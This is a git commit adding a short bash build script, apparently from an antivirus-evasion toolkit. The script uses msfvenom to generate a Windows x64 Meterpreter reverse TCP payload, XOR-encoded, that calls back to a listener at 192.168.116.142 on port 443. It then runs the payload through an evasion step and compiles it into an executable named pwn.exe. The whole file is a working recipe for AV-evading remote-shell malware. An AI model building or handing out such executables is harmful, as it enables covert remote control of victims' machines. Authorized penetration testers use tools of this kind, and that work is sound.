63fbe9e5f9502869bef9e623561ed566dd61af91
Daniel Sauder <daniel.sauder@web.de>
2017-04-02 17:09:29 +0200

    add build script

---
+++ build/build_win64_meterpreter_rev_tcp_xor_fopen.sh
@@ -0,0 +1,9 @@
+#!/bin/bash          
+# example script for building executables with 64bit payload
+. build/global_win64.sh
+# make meterpreter reverse payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 -e x64/xor lport=443 -f c --platform Windows > sc.txt
+./make_avet -f sc.txt -F -X
+$win64_compiler -o pwn.exe avet.c
+# cleanup
+rm sc.txt && echo "" > defs.h
